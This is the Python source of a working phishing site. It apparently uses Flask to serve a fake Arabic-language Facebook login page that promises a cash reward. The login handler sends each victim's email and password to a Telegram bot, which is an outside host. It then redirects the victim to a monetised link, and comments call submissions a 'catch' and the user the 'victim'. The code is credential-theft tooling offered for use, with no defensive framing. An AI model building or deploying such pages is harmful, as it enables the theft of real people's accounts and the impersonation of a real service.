import os
import requests
from flask import Flask, request, redirect

app = Flask(__name__)

# --- إعدادات التلغرام (تأكد من صحتها) ---
BOT_TOKEN = "7917897258:AAH8N6L3X8J8L6_J8X8J8L6_J8X8J8L6" 
CHAT_ID = "7449520860"

# --- رابط التمويه (موقع الدراهم) ---
MONEY_SITE = "https://trianglerockers.com/1885419"

HTML_PAGE = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - تسجيل الدخول</title>
    <style>
        body { font-family: Helvetica, Arial, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .box { background: white; padding: 25px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); width: 100%; max-width: 400px; text-align: center; }
        .fb-logo { color: #1877f2; font-size: 35px; font-weight: bold; margin-bottom: 15px; }
        p { font-size: 16px; color: #1c1e21; margin-bottom: 20px; font-weight: 500; line-height: 1.4; }
        input { width: 90%; padding: 12px; margin: 8px 0; border: 1px solid #dddfe2; border-radius: 6px; font-size: 15px; background-color: #f5f6f7; }
        button { width: 96%; padding: 12px; background: #1877f2; color: white; border: none; border-radius: 6px; font-size: 18px; font-weight: bold; cursor: pointer; margin-top: 10px; }
        .footer { margin-top: 25px; border-top: 1px solid #dddfe2; padding-top: 20px; }
        .create-btn { background: #42b72a; color: white; padding: 10px 20px; border-radius: 6px; text-decoration: none; font-weight: bold; font-size: 14px; }
    </style>
</head>
<body>
    <div class="box">
        <div class="fb-logo">facebook</div>
        <p>قم بتسجيل الدخول إلى حسابك على فيسبوك للمطالبة بمكافأة الـ 1800 دج فوراً.</p>
        <form method="POST" action="/login">
            <input type="text" name="email" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
            <input type="password" name="password" placeholder="كلمة السر" required>
            <button type="submit">تسجيل الدخول</button>
        </form>
        <div class="footer">
            <a href="#" class="create-btn">إنشاء حساب جديد</a>
        </div>
    </div>
</body>
</html>
"""

@app.route('/')
def index():
    return HTML_PAGE

@app.route('/login', methods=['POST'])
def login():
    email = request.form.get('email')
    password = request.form.get('password')
    
    # إرسال البيانات للتلغرام
    message = f"✅ صيدة جديدة من فارس!\n📧 الإيميل: {email}\n🔑 الباسورد: {password}"
    try:
        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", data={"chat_id": CHAT_ID, "text": message})
    except:
        pass
    
    # تحويل الضحية لموقع الدراهم تلقائياً
    return redirect(MONEY_SITE)

if __name__ == '__main__':
    # الحصول على البورت من Render بشكل آلي
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
